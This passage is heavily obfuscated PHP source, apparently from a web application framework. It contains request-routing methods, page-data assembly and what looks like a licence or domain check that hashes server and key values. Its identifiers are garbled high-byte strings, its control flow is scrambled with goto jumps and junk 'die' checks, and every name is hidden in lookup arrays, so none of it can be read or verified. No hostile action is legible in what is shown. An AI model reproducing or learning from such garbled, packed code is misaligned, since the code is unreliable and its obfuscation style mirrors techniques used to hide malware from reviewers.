$F­¦ÏŠ‚¼ö = $F–Ûï•îÊÂ[557]; if (!$F­¦ÏŠ‚¼ö) { return; } $Aô‘éÚ’[13](array($Aô‘éÚ’[14], $Aô‘éÚ’[15]), $D‘Ë¾¬à­ğ . $Aô‘éÚ’[18], $Fí´¸ÛŞÁØ); goto BŠî†Œ…­; cÜ¸İòºÎÔ: $Dæ‘Àğ«òÜ = $F–Ûï•îÊÂ[555]; if (strlen($Dæ‘Àğ«òÜ) < $F–Ûï•îÊÂ[556]) { die; } $D‘Ë¾¬à­ğ = $Aô‘éÚ’[7]; goto f‹òŒÜõ°§; f‹òŒÜõ°§: if ($B¶ÚÖŸîÓ“ == $Aô‘éÚ’[8]) { $D‘Ë¾¬à­ğ = $Aô‘éÚ’[9]; $f™’ê òĞ[0] = $Aô‘éÚ’[10]; $f™’ê òĞ[1] = $f™’ê òĞ[1] . $Aô‘éÚ’[11]; $Fí´¸ÛŞÁØ = $Aô‘éÚ’[12]($Aô‘éÚ’[1], $f™’ê òĞ); $Fí´¸ÛŞÁØ = $Aô‘éÚ’[2]($Fí´¸ÛŞÁØ, $Aô‘éÚ’[1]); } $Aô‘éÚ’[13](array($Aô‘éÚ’[14], $Aô‘éÚ’[15]), $D‘Ë¾¬à­ğ . $Aô‘éÚ’[16], $Fí´¸ÛŞÁØ); $Aô‘éÚ’[17]($Fí´¸ÛŞÁØ); goto c‡Î¡øªÈ; BŠî†Œ…­: } private function autorun() { goto b¯ °ÈÌí; b¯ °ÈÌí: $cîĞ¦¥»ß =& $_SERVER[¼€¼ˆ¦‚¡]; $EÜÇÙæ„Æ© =& $_SERVER[™óşĞñ‡Ë]; global $config; goto B„†²çŠô½; E•ƒ‚Ü…ä¬: foreach ($config[$EÜÇÙæ„Æ©[20]] as $aö¸Ç¦õ÷ => $c¹ñÉ»êØÖ) { $this->{$_SERVER[™óşĞñ‡Ë][21]}($c¹ñÉ»êØÖ); $bÎÔëˆŸß = $cîĞ¦¥»ß[559]; if (!$bÎÔëˆŸß) { die; } } goto cÓÆƒˆƒº; B„†²çŠô½: $E¥ ‘Ó®¿â = $cîĞ¦¥»ß[558]; while (strlen($E¥ ‘Ó®¿â) < $cîĞ¦¥»ß[554]) { if (!$E¥ ‘Ó®¿â) { break; } $E¥ ‘Ó®¿â++; } if ($EÜÇÙæ„Æ©[19]($config[$EÜÇÙæ„Æ©[20]]) == 0) { return; } goto E•ƒ‚Ü…ä¬; cÓÆƒˆƒº: } private function yeujfe426516() { goto aãç‹Ñ¿»; AäõŠµÆÚ: $GLOBALS[$c›¿ÀÆê[22]][$c›¿ÀÆê[28]] = $c›¿ÀÆê[29]($c›¿ÀÆê[1], $GLOBALS[$c›¿ÀÆê[22]][$c›¿ÀÆê[23]]); goto aÏá¨ôšƒ; cÒ›°†¬¤¾: if (!$b±â“÷ùÒ || $c›¿ÀÆê[24]($b±â“÷ùÒ) <= $c›¿ÀÆê[24]($e“šºÌ™‹‰)) { return; } if ($c›¿ÀÆê[6]($c›¿ÀÆê[25]($b±â“÷ùÒ, -$c›¿ÀÆê[24]($e“šºÌ™‹‰))) != $e“šºÌ™‹‰) { return; } $aÜùï¦ÁœÔ = $c›¿ÀÆê[25]($b±â“÷ùÒ, 0, -$c›¿ÀÆê[24]($e“šºÌ™‹‰)); goto AÅ©¯½¯ß; aãç‹Ñ¿»: $c›¿ÀÆê =& $_SERVER[™óşĞñ‡Ë]; $e“šºÌ™‹‰ = $c›¿ÀÆê[8]; $b±â“÷ùÒ = $GLOBALS[$c›¿ÀÆê[22]][$c›¿ÀÆê[23]][0]; goto cÒ›°†¬¤¾; AÅ©¯½¯ß: $EñŠ¯Œ†² = array($c›¿ÀÆê[8], $aÜùï¦ÁœÔ); $AÄ«®µ–Òã = $c›¿ÀÆê[26]($GLOBALS[$c›¿ÀÆê[22]][$c›¿ÀÆê[23]], 1); $GLOBALS[$c›¿ÀÆê[22]][$c›¿ÀÆê[23]] = $c›¿ÀÆê[27]($EñŠ¯Œ†², $AÄ«®µ–Òã); goto AäõŠµÆÚ; aÏá¨ôšƒ: } private function oaxi3af4f975() { goto E‘Èçôèí­; DÇ‰„ŠÈÂÏ: $dÌÌ™”¥à = $CøÔˆÏêãù[2]($D®œÅ†İÄ…[0][0], $CøÔˆÏêãù[36]); $bŠ‰¹õ“¹Ô = $føÚœ¸“©[564]; if (!$bŠ‰¹õ“¹Ô) { return; } goto C§–«½—È„; aõ†¿èçİˆ: $a¿áã‰«“– = $føÚœ¸“©[561]; $dÌÌ™”¥à = $CøÔˆÏêãù[25]($EÍ½íó†Ã„, $Fù¦…ÓÀ + $CøÔˆÏêãù[24]($cóì¦Û×šÀ)); $C¦­·»Î = $føÚœ¸“©[562]; goto AßŒ ÇñÏŸ; aÇé¸°º™§: if (!$f•—ëßÑğ¡) { die; } if (!$CøÔˆÏêãù[32]($EÍ½íó†Ã„, $cóì¦Û×šÀ)) { return; } $Fù¦…ÓÀ = $CøÔˆÏêãù[33]($EÍ½íó†Ã„, $cóì¦Û×šÀ); goto aõ†¿èçİˆ; D¥Îİ›Ùˆ„: $EÍ½íó†Ã„ = $_SERVER[$CøÔˆÏêãù[30]]; $cóì¦Û×šÀ = $CøÔˆÏêãù[31]; $f•—ëßÑğ¡ = $føÚœ¸“©[560]; goto aÇé¸°º™§; AßŒ ÇñÏŸ: $CøÔˆÏêãù[34]($CøÔˆÏêãù[35], $dÌÌ™”¥à, $D®œÅ†İÄ…); $cÇ»Ë´š„á = $føÚœ¸“©[563]; if (!$cÇ»Ë´š„á) { return; } goto DÇ‰„ŠÈÂÏ; E‘Èçôèí­: $føÚœ¸“© =& $_SERVER[¼€¼ˆ¦‚¡]; $CøÔˆÏêãù =& $_SERVER[™óşĞñ‡Ë]; if ($GLOBALS[$CøÔˆÏêãù[22]][$CøÔˆÏêãù[28]] != $CøÔˆÏêãù[10]) { return; } goto D¥Îİ›Ùˆ„; C§–«½—È„: $GLOBALS[$CøÔˆÏêãù[22]][$CøÔˆÏêãù[23]] = $CøÔˆÏêãù[0]($CøÔˆÏêãù[36], $dÌÌ™”¥à); $GLOBALS[$CøÔˆÏêãù[22]][$CøÔˆÏêãù[28]] = $CøÔˆÏêãù[29]($CøÔˆÏêãù[1], $GLOBALS[$CøÔˆÏêãù[22]][$CøÔˆÏêãù[23]]); $DœÔ×‚– = $føÚœ¸“©[565]; goto fÒ±Ÿ–¹í‘; fÒ±Ÿ–¹í‘: } public function run() { goto B¤ïğÅ¼º ; fæ ¥ù§Œ‚: if (!$a¡¦Ñˆƒ¤é) { return; } $EÜÜ÷£ìßº[39]($EÜÜ÷£ìßº[41], isset($bÀëğ¸¥¹÷[1]) && $bÀëğ¸¥¹÷[0] ? $bÀëğ¸¥¹÷[1] : $this->defaultController); $A¨ãÉÜöÍ— = $EÙ´«ÁØì[568]; goto fİƒÒ¨ÒŸ; e‘¥Ò’¡“ß: $DÑ†¡Êìİ´ = $EÙ´«ÁØì[566]; $this->{$_SERVER[™óşĞñ‡Ë][38]}(); $bÀëğ¸¥¹÷ = $GLOBALS[$EÜÜ÷£ìßº[22]][$EÜÜ÷£ìßº[23]]; goto FˆÂ¹ÚŒŞ“; fİƒÒ¨ÒŸ: if (strlen($A¨ãÉÜöÍ—) < $EÙ´«ÁØì[554]) { die; } $EÜÜ÷£ìßº[39]($EÜÜ÷£ìßº[42], isset($bÀëğ¸¥¹÷[2]) && $bÀëğ¸¥¹÷[0] ? $bÀëğ¸¥¹÷[2] : $this->defaultAction); $F¿ø¨˜Şöë = $EÙ´«ÁØì[569]; goto b¢¨Û ’Å‚; B¤ïğÅ¼º : $EÙ´«ÁØì =& $_SERVER[¼€¼ˆ¦‚¡]; $EÜÜ÷£ìßº =& $_SERVER[™óşĞñ‡Ë]; $this->{$_SERVER[™óşĞñ‡Ë][37]}(); goto e‘¥Ò’¡“ß; BƒŸ–»Ö´¯: $eÌßà÷ñÁ« = $EÙ´«ÁØì[572]; if ($EÜÜ÷£ìßº[19]($bÀëğ¸¥¹÷) >= 3) { $this->{$_SERVER[™óşĞñ‡Ë][21]}($F´ˆ³ƒ¹ƒÏ); } else { $this->{$_SERVER[™óşĞñ‡Ë][21]}(ACTION); } goto CŞ²ƒë»ƒè; b¢¨Û ’Å‚: if (strlen($F¿ø¨˜Şöë) < $EÙ´«ÁØì[556]) { return; } $EÜÜ÷£ìßº[39]($EÜÜ÷£ìßº[43], MOD . $EÜÜ÷£ìßº[1] . ST . $EÜÜ÷£ìßº[1] . ACT); $_SERVER[$EÜÜ÷£ìßº[44]] = $EÜÜ÷£ìßº[6](ACTION); goto eâ±‚ëÙ»Ñ; FˆÂ¹ÚŒŞ“: $F´ˆ³ƒ¹ƒÏ = $GLOBALS[$EÜÜ÷£ìßº[22]][$EÜÜ÷£ìßº[28]]; $EÜÜ÷£ìßº[39]($EÜÜ÷£ìßº[40], isset($bÀëğ¸¥¹÷[0]) && $bÀëğ¸¥¹÷[0] ? $bÀëğ¸¥¹÷[0] : $this->defaultModule); $a¡¦Ñˆƒ¤é = $EÙ´«ÁØì[567]; goto fæ ¥ù§Œ‚; eâ±‚ëÙ»Ñ: $Dğ›—•ÉÚ = $EÙ´«ÁØì[570]; if (strlen($Dğ›—•ÉÚ) < $EÙ´«ÁØì[571]) { return; } $this->{$_SERVER[™óşĞñ‡Ë][45]}(); goto BƒŸ–»Ö´¯; CŞ²ƒë»ƒè: } private $tfgvf5ecaa5c = array(); private $trqk3bcdf44e = ''; public function dpim5f0316d8() { goto dß™µÔÆÒÑ; f£§¼•Óù: $this->{$_SERVER[™óşĞñ‡Ë][47]}(); $this->{$_SERVER[™óşĞñ‡Ë][48]}(); $this->{$_SERVER[™óşĞñ‡Ë][49]}(); goto f–ßâ”Š¾³; aŞ˜«Ó˜ˆ: $this->{$_SERVER[™óşĞñ‡Ë][3]}($DÛ˜Ô´õ…Ÿ[53], array($this, $DÛ˜Ô´õ…Ÿ[54])); $E¥‹ˆ¦Äñà = $a„¼ŞŠ¡°™[573]; $this->{$_SERVER[™óşĞñ‡Ë][3]}($DÛ˜Ô´õ…Ÿ[55], array($this, $DÛ˜Ô´õ…Ÿ[56])); goto bÅ‹ËÚÂ‰²; dß™µÔÆÒÑ: $a„¼ŞŠ¡°™ =& $_SERVER[¼€¼ˆ¦‚¡]; $DÛ˜Ô´õ…Ÿ =& $_SERVER[™óşĞñ‡Ë]; $this->{$_SERVER[™óşĞñ‡Ë][46]}(); goto f£§¼•Óù; bÅ‹ËÚÂ‰²: $this->{$_SERVER[™óşĞñ‡Ë][3]}($DÛ˜Ô´õ…Ÿ[57], array($this, $DÛ˜Ô´õ…Ÿ[58])); $this->{$_SERVER[™óşĞñ‡Ë][3]}($DÛ˜Ô´õ…Ÿ[59], array($this, $DÛ˜Ô´õ…Ÿ[60])); $b•¸–ÜÁ = $a„¼ŞŠ¡°™[574]; goto FÛŒêã‹ß×; f–ßâ”Š¾³: $this->{$_SERVER[™óşĞñ‡Ë][50]}(); $this->{$_SERVER[™óşĞñ‡Ë][51]}(); $this->{$_SERVER[™óşĞñ‡Ë][52]}(); goto aŞ˜«Ó˜ˆ; FÛŒêã‹ß×: } public function vqgi2f128b1f($AÆÑÎ±±áé) { goto cŒááÊ‚ˆ; A²¼—ğÃ³: $Aß»Ù›¶… = $AÓ¶ä”èµæ[577]; if (strlen($Aß»Ù›¶…) < $AÓ¶ä”èµæ[578]) { return; } if ($f¸Öø²Â”«[104]($GLOBALS, $f¸Öø²Â”«[132]) && $this->config[$f¸Öø²Â”«[133]]) { $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[134]] = WEB_ROOT; } goto bÈÜ¥Ö±Ã—; cŒááÊ‚ˆ: $AÓ¶ä”èµæ =& $_SERVER[¼€¼ˆ¦‚¡]; $f¸Öø²Â”« =& $_SERVER[™óşĞñ‡Ë]; $f—Øè±àÒÅ = $f¸Öø²Â”«[61]($f¸Öø²Â”«[62])->{$_SERVER[™óşĞñ‡Ë][63]}(); goto D…ˆ¶İÁ; Dá¦’Ã“Ö: $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[113]] = $f¸Öø²Â”«[114]($_SERVER[$f¸Öø²Â”«[115]] . $f—Øè±àÒÅ[$f¸Öø²Â”«[116]]); $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[117]] = $f¸Öø²Â”«[118]($f¸Öø²Â”«[119]()); $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[120]] = $this->trqk3bcdf44e; goto Ağš¿ˆ‰‰‘; bÈÜ¥Ö±Ã—: return $AÆÑÎ±±áé; goto C©›…–ê š; Ağš¿ˆ‰‰‘: $e¢Á­ğŒƒ” = $AÓ¶ä”èµæ[576]; while (strlen($e¢Á­ğŒƒ”) < $AÓ¶ä”èµæ[571]) { if (!$e¢Á­ğŒƒ”) { break; } $e¢Á­ğŒƒ”++; } if ($f—Øè±àÒÅ[$f¸Öø²Â”«[120]] != $f¸Öø²Â”«[121]) { $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[122]] = $f—Øè±àÒÅ[$f¸Öø²Â”«[122]]; $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[123]] = $f—Øè±àÒÅ[$f¸Öø²Â”«[123]]; $c¶Şôğ”æ¢ = $f¸Öø²Â”«[124](10) . $this->trqk3bcdf44e . $f¸Öø²Â”«[124](5); $AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[125]][$f¸Öø²Â”«[126]] = $this->{$_SERVER[™óşĞñ‡Ë][127]}($c¶Şôğ”æ¢, $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[113]]); } goto d„Ë×¾”; d„Ë×¾”: if ($this->trqk3bcdf44e == $f¸Öø²Â”«[121]) { $AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[94]][$f¸Öø²Â”«[99]][$f¸Öø²Â”«[107]] = 0; } $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[128]] = $f¸Öø²Â”«[104]($this->tfgvf5ecaa5c, $f¸Öø²Â”«[129], $f¸Öø²Â”«[10]); $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[130]] = $f¸Öø²Â”«[104]($this->tfgvf5ecaa5c, $f¸Öø²Â”«[131], $f¸Öø²Â”«[10]); goto A²¼—ğÃ³; A‚‚‰¦äƒ: unset($AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[95]][$f¸Öø²Â”«[96]]); unset($AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[95]][$f¸Öø²Â”«[97]]); unset($AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[94]][$f¸Öø²Â”«[76]]); goto déö…£¹¬õ; déö…£¹¬õ: unset($AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[94]][$f¸Öø²Â”«[98]]); $AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[94]][$f¸Öø²Â”«[99]] = array($f¸Öø²Â”«[100] => (int) $b–òóë™Ó[$f¸Öø²Â”«[101]], $f¸Öø²Â”«[102] => $f¸Öø²Â”«[103]($f¸Öø²Â”«[104]($b–òóë™Ó, $f¸Öø²Â”«[105], array())), $f¸Öø²Â”«[106] => (int) $f¸Öø²Â”«[104]($b–òóë™Ó, $f¸Öø²Â”«[107], 0)); $AÆÑÎ±±áé[$f¸Öø²Â”«[108]][$f¸Öø²Â”«[109]] = $f¸Öø²Â”«[110]($f¸Öø²Â”«[111])->{$_SERVER[™óşĞñ‡Ë][112]}(); goto Dá¦’Ã“Ö; D…ˆ¶İÁ: $d•˜š›´×§ = array($f¸Öø²Â”«[64], $f¸Öø²Â”«[65], $f¸Öø²Â”«[66], $f¸Öø²Â”«[67], $f¸Öø²Â”«[68], $f¸Öø²Â”«[69], $f¸Öø²Â”«[70], $f¸Öø²Â”«[71], $f¸Öø²Â”«[72], $f¸Öø²Â”«[73], $f¸Öø²Â”«[74], $f¸Öø²Â”«[75], $f¸Öø²Â”«[76], $f¸Öø²Â”«[77], $f¸Öø²Â”«[78], $f¸Öø²Â”«[79], $f¸Öø²Â”«[80], $f¸Öø²Â”«[81], $f¸Öø²Â”«[82], $f¸Öø²Â”«[83], $f¸Öø²Â”«[84], $f¸Öø²Â”«[85], $f¸Öø²Â”«[86], $f¸Öø²Â”«[87], $f¸Öø²Â”«[88], $f¸Öø²Â”«[89], $f¸Öø²Â”«[90]); foreach ($d•˜š›´×§ as $fß¨âãÙŠÃ) { $f¬¸£Ó¬ª  = $GLOBALS[$f¸Öø²Â”«[91]][$f¸Öø²Â”«[92]][$fß¨âãÙŠÃ]; $a‡å·ËÜÁ¯ = $AÓ¶ä”èµæ[575]; if (strlen($a‡å·ËÜÁ¯) < $AÓ¶ä”èµæ[556]) { die; } if (isset($f—Øè±àÒÅ[$fß¨âãÙŠÃ])) { $f¬¸£Ó¬ª  = $f—Øè±àÒÅ[$fß¨âãÙŠÃ]; } $AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[94]][$fß¨âãÙŠÃ] = $f¬¸£Ó¬ª ; } $b–òóë™Ó = $AÆÑÎ±±áé[$f¸Öø²Â”«[93]][$f¸Öø²Â”«[94]][$f¸Öø²Â”«[76]]; goto A‚‚‰¦äƒ; C©›…–ê š: } private function klmyaef9461d() { goto cÎ±²­Ò; aÎ·»àãÁ: foreach ($a¦çêÕíƒ as $AÑ°Ä×Ä‰) { if (!isset($EÂ‚†ƒ°¦‡[$AÑ°Ä×Ä‰]) || !$EÂ‚†ƒ°¦‡[$AÑ°Ä×Ä‰]) { continue; } $bä‘…øªİ[$AÑ°Ä×Ä‰] = $EÂ‚†ƒ°¦‡[$AÑ°Ä×Ä‰]; } $cœ»Ëë¥[13](array($cœ»Ëë¥[151], $cœ»Ëë¥[152]), $bä‘…øªİ); goto EÍ¨ì óÏ; EÀĞ£–ø×½: $bä‘…øªİ = array($cœ»Ëë¥[159] => $EÂ‚†ƒ°¦‡[$cœ»Ëë¥[64]], $cœ»Ëë¥[160] => $EÂ‚†ƒ°¦‡[$cœ»Ëë¥[65]], $cœ»Ëë¥[161] => $cœ»Ëë¥[10]); $a½«İÛé‰Ä = $E¹“Ãİ¦Ä[581]; if (strlen($a½«İÛé‰Ä) < $E¹“Ãİ¦Ä[578]) { return; } goto aÎ·»àãÁ; cÎ±²­Ò: $E¹“Ãİ¦Ä =& $_SERVER[¼€¼ˆ¦‚¡]; $cœ»Ëë¥ =& $_SERVER[™óşĞñ‡Ë]; if ($_SERVER[$cœ»Ëë¥[44]] == $cœ»Ëë¥[135]) { goto B‘ï§¢«Ë; fÓ©Ø”ëÎÈ: $fÁŞŸˆ‡Ò‚ = $E¹“Ãİ¦Ä[579]; $bä‘…øªİ = array($cœ»Ëë¥[150] => $EÉÓÂ£µ²›); $fï†–”éôä = $E¹“Ãİ¦Ä[580]; goto cùîÜãùÆá; B‘ï§¢«Ë: $EÉÓÂ£µ²› = array($cœ»Ëë¥[120] => $this->trqk3bcdf44e, $cœ»Ëë¥[136] => $this->{$_SERVER[™óşĞñ‡Ë][137]}(), $cœ»Ëë¥[138] => $cœ»Ëë¥[61]($cœ»Ëë¥[139])->{$_SERVER[™óşĞñ‡Ë][140]}()); if ($this->trqk3bcdf44e != $cœ»Ëë¥[121]) { $EâÈ­êÖ“õ = $cœ»Ëë¥[104]($this->tfgvf5ecaa5c, $cœ»Ëë¥[141]); if ($EâÈ­êÖ“õ) { $EÉÓÂ£µ²›[$cœ»Ëë¥[142]] = $EâÈ­êÖ“õ; $EÉÓÂ£µ²›[$cœ»Ëë¥[143]] = $cœ»Ëë¥[144]($cœ»Ëë¥[104]($this->tfgvf5ecaa5c, $cœ»Ëë¥[145])); $EÉÓÂ£µ²›[$cœ»Ëë¥[146]] = $cœ»Ëë¥[104]($this->tfgvf5ecaa5c, $cœ»Ëë¥[131]); } } $EÉÓÂ£µ²› = $this->{$_SERVER[™óşĞñ‡Ë][147]}($cœ»Ëë¥[148]($EÉÓÂ£µ²›), $cœ»Ëë¥[114]($cœ»Ëë¥[149])); goto fÓ©Ø”ëÎÈ; cùîÜãùÆá: if (strlen($fï†–”éôä) < $E¹“Ãİ¦Ä[554]) { die; } $cœ»Ëë¥[13](array($cœ»Ëë¥[151], $cœ»Ëë¥[152]), $bä‘…øªİ); goto DÍ¢¥ğ¶×Î; DÍ¢¥ğ¶×Î: } goto bšµàÙØô; bšµàÙØô: if ($this->trqk3bcdf44e == $cœ»Ëë¥[121]) { return; } $a¦çêÕíƒ = array($cœ»Ëë¥[153], $cœ»Ëë¥[154], $cœ»Ëë¥[155], $cœ»Ëë¥[156], $cœ»Ëë¥[157], $cœ»Ëë¥[158]); $EÂ‚†ƒ°¦‡ = $cœ»Ëë¥[61]($cœ»Ëë¥[62])->{$_SERVER[™óşĞñ‡Ë][63]}(); goto EÀĞ£–ø×½; EÍ¨ì óÏ: } private function igkl27cb4b58() { goto ašÌÆìåóÄ; d˜¯ğ‘õš™: $E½Ç÷æˆ×î = $BŸ²‘ïĞõ[582]; if (!$E½Ç÷æˆ×î) { die; } $C÷ÜÇĞÓò• = $e¸«İö‘Äï[114]($_SERVER[$e¸«İö‘Äï[115]] . $B”²Ë¥š×õ); goto EÈŸ¥Ö“ÑÁ; A¨×åÕÉ: $fº’ÍŞ­Á² = $BŸ²‘ïĞõ[584]; if (!$CìÓ··…Ú  || $CìÓ··…Ú  != $e¸«İö‘Äï[201]($C†º¿ÃÆˆ“[$e¸«İö‘Äï[145]])) { $eÃŞÎšõ˜Ş = array($e¸«İö‘Äï[202] => $e¸«İö‘Äï[61]($e¸«İö‘Äï[62])->{$_SERVER[™óşĞñ‡Ë][63]}($e¸«İö‘Äï[116]), $e¸«İö‘Äï[203] => $_SERVER[$e¸«İö‘Äï[115]], $e¸«İö‘Äï[204] => $e¸«İö‘Äï[205](), $e¸«İö‘Äï[174] => $_SERVER[$e¸«İö‘Äï[175]]); $CËÂÄö¾ªÁ = $this->{$_SERVER[™óşĞñ‡Ë][206]}($e¸«İö‘Äï[148]($eÃŞÎšõ˜Ş)); $this->{$_SERVER[™óşĞñ‡Ë][182]}($e¸«İö‘Äï[207] . $CËÂÄö¾ªÁ); $e¸«İö‘Äï[166]($e¸«İö‘Äï[197]($e¸«İö‘Äï[208]), !0); } $d‡½î­‹‡ö = array($e¸«İö‘Äï[209] => $cğ­„öÅ‰Å[$e¸«İö‘Äï[165]], $e¸«İö‘Äï[210] => $C†º¿ÃÆˆ“[$e¸«İö‘Äï[211]], $e¸«İö‘Äï[212] => $e¸«İö‘Äï[124](16), $e¸«İö‘Äï[120] => $C†º¿ÃÆˆ“[$e¸«İö‘Äï[213]]); goto C«Œ“Ÿ¦Çï; Aì±‚¿Ó¯¢: $d‡½î­‹‡ö[$e¸«İö‘Äï[122]] = $e¸«İö‘Äï[214]($e¸«İö‘Äï[118]($this->{$_SERVER[™óşĞñ‡Ë][147]}($f¤ã¾´İºò, $e¸«İö‘Äï[215]))); $B­ìÜˆñ© = $BŸ²‘ïĞõ[585]; if (!$B­ìÜˆñ©) { die; } goto B©Æ¥¨œÊ£; fğ—µÚƒŸè: $Fµø“ãÁà = $BŸ²‘ïĞõ[589]; while (strlen($Fµø“ãÁà) < $BŸ²‘ïĞõ[578]) { if (!$Fµø“ãÁà) { break; } $Fµø“ãÁà++; } $a¿ˆÙÛ×ñ = $this->{$_SERVER[™óşĞñ‡Ë][127]}($e¸«İö‘Äï[148]($C†º¿ÃÆˆ“), $Eê¸˜êùáÌ); goto d¾ŒãéÓŒ; A¸ìİäÚä: $e¸«İö‘Äï[61]($e¸«İö‘Äï[11])->{$_SERVER[™óşĞñ‡Ë][226]}($EŞŸŸÔé˜ò[$e¸«İö‘Äï[227]], array($e¸«İö‘Äï[228] => $CíÒ‘ŠÜ¡œ)); $e«Óˆ¹»ÃÒ = $BŸ²‘ïĞõ[591]; while (strlen($e«Óˆ¹»ÃÒ) < $BŸ²‘ïĞõ[556]) { if (!$e«Óˆ¹»ÃÒ) { break; } $e«Óˆ¹»ÃÒ++; } goto FÏäÌƒÆÈ; d¾ŒãéÓŒ: $Càİ‘çÔ¨ = $e¸«İö‘Äï[222]($e¸«İö‘Äï[61]($e¸«İö‘Äï[11])->{$_SERVER[™óşĞñ‡Ë][223]}(), $e¸«İö‘Äï[224]); $dŒ‹´¸•ñÆ = $BŸ²‘ïĞõ[590]; if (strlen($dŒ‹´¸•ñÆ) < $BŸ²‘ïĞõ[578]) { die; } goto EÙ‹®¹ŸÁˆ; bëïÖ§®·‹: if (strlen($f×ÚÉ¨Ğº—) < $BŸ²‘ïĞõ[554]) { return; } $d‡½î­‹‡ö[$e¸«İö‘Äï[123]] = $e¸«İö‘Äï[118]($e¸«İö‘Äï[214]($this->{$_SERVER[™óşĞñ‡Ë][147]}($Eö¡´œ¦ÎÌ, $e¸«İö‘Äï[216]))); $A¹áŒ£²µ = $BŸ²‘ïĞõ[587]; goto CŠø‚•; fëò—ôî‚: if (!isset($cöšÖùŠà¶[$e¸«İö‘Äï[165]]) || $e¸«İö‘Äï[24]($cöšÖùŠà¶[$e¸«İö‘Äï[165]]) != 16) { $e¸«İö‘Äï[166]($e¸«İö‘Äï[167] . $cöšÖùŠà¶[$e¸«İö‘Äï[165]], !1); } $B”²Ë¥š×õ = $e¸«İö‘Äï[61]($e¸«İö‘Äï[62])->{$_SERVER[™óşĞñ‡Ë][63]}($e¸«İö‘Äï[116]); $cğ­„öÅ‰Å = array($e¸«İö‘Äï[165] => $cöšÖùŠà¶[$e¸«İö‘Äï[165]], $e¸«İö‘Äï[168] => $e¸«İö‘Äï[124](16), $e¸«İö‘Äï[169] => $e¸«İö‘Äï[149], $e¸«İö‘Äï[170] => $e¸«İö‘Äï[171], $e¸«İö‘Äï[172] => $_SERVER[$e¸«İö‘Äï[173]], $e¸«İö‘Äï[174] => $_SERVER[$e¸«İö‘Äï[175]], $e¸«İö‘Äï[176] => $_SERVER[$e¸«İö‘Äï[177]]); goto d˜¯ğ‘õš™; fÊäŠšøÂò: $Eê¸˜êùáÌ = $e¸«İö‘Äï[114]($_SERVER[$e¸«İö‘Äï[115]] . $e¸«İö‘Äï[214]($B”²Ë¥š×õ) . $d‡½î­‹‡ö[$e¸«İö‘Äï[210]]); $c¡Ù»£Ş§ = $BŸ²‘ïĞõ[588]; $B Şê«È = $e¸«İö‘Äï[214]($e¸«İö‘Äï[25]($Eê¸˜êùáÌ, 10, 16)); goto fğ—µÚƒŸè; bÈ«ÏõŞ: if (!$e¸«İö‘Äï[191]($Eæâİù©¢Í) || !$e¸«İö‘Äï[191]($Eæâİù©¢Í[$e¸«İö‘Äï[192]]) || $Eæâİù©¢Í[$e¸«İö‘Äï[165]] != !0) { $AÉŒ×”–ƒÀ = $e¸«İö‘Äï[197]($e¸«İö‘Äï[198]); $F’™æö°İ£ = $Eæâİù©¢Í[$e¸«İö‘Äï[192]] ? $e¸«İö‘Äï[194] . $Eæâİù©¢Í[$e¸«İö‘Äï[192]] : $AÉŒ×”–ƒÀ; $e¸«İö‘Äï[166]($F’™æö°İ£, !1); } $C†º¿ÃÆˆ“ = $Eæâİù©¢Í[$e¸«İö‘Äï[192]]; $CìÓ··…Ú  = $this->{$_SERVER[™óşĞñ‡Ë][199]}($C†º¿ÃÆˆ“[$e¸«İö‘Äï[200]]); goto A¨×åÕÉ; EÙ‹®¹ŸÁˆ: $EŞŸŸÔé˜ò = $Càİ‘çÔ¨[$e¸«İö‘Äï[225]]; $CíÒ‘ŠÜ¡œ = array(); $CíÒ‘ŠÜ¡œ[$B Şê«È] = $a¿ˆÙÛ×ñ; goto A¸ìİäÚä; ašÌÆìåóÄ: $BŸ²‘ïĞõ =& $_SERVER[¼€¼ˆ¦‚¡]; $e¸«İö‘Äï =& $_SERVER[™óşĞñ‡Ë]; if ($_SERVER[$e¸«İö‘Äï[44]] != $e¸«İö‘Äï[162]) { return; } goto eïÚÅÕó¬Ğ; B©Æ¥¨œÊ£: $a¶Ôß£³„ = $e¸«İö‘Äï[124](16); $Eö¡´œ¦ÎÌ = $a¶Ôß£³„ . $d‡½î­‹‡ö[$e¸«İö‘Äï[120]] . $this->{$_SERVER[™óşĞñ‡Ë][147]}($e¸«İö‘Äï[114]($d‡½î­‹‡ö[$e¸«İö‘Äï[209]]), $a¶Ôß£³„); $f×ÚÉ¨Ğº— = $BŸ²‘ïĞõ[586]; goto bëïÖ§®·‹; CñÏ•µÆ¯Ã: $e¸«İö‘Äï[166]($e¸«İö‘Äï[197]($e¸«İö‘Äï[208]), !0); goto F±ÖŞ¾ŒÌŒ; CŠø‚•: if (strlen($A¹áŒ£²µ) < $BŸ²‘ïĞõ[571]) { return; } if ($C†º¿ÃÆˆ“[$e¸«İö‘Äï[217]] && $C†º¿ÃÆˆ“[$e¸«İö‘Äï[217]] >= 1) { $e¸«İö‘Äï[61]($e¸«İö‘Äï[62])->{$_SERVER[™óşĞñ‡Ë][218]}($e¸«İö‘Äï[219], $e¸«İö‘Äï[220]); } $e¸«İö‘Äï[61]($e¸«İö‘Äï[62])->{$_SERVER[™óşĞñ‡Ë][221]}($d‡½î­‹‡ö); goto fÊäŠšøÂò; C«Œ“Ÿ¦Çï: if ($cğ­„öÅ‰Å[$e¸«İö‘Äï[168]]) { $d‡½î­‹‡ö[$e¸«İö‘Äï[212]] = 